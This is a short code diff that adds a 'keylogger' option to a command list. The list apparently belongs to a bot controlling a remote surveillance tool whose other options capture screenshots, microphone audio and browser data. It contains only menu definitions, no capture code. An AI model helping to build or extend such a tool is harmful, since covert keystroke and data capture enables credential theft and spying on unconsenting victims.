@@ -37,6 +37,10 @@ export const commands = [
                         value: 'microphone',
                     },
                     {
+                        name: 'keylogger',
+                        value: 'keylogger',
+                    },
+                    {
                         name: 'stop',
                         value: 'stop',
                     },
@@ -96,7 +100,8 @@ export const commands = [
                 choices: [
                     { name: 'Captures d\'écran', value: 'screenshot' },
                     { name: 'Enregistrements audio', value: 'microphone' },
-                    { name: 'Données de navigation', value: 'browserdata' }
+                    { name: 'Données de navigation', value: 'browserdata' },
+                    { name: 'Enregistrements du clavier', value: 'keylogger' }
                 ],
             },
             {
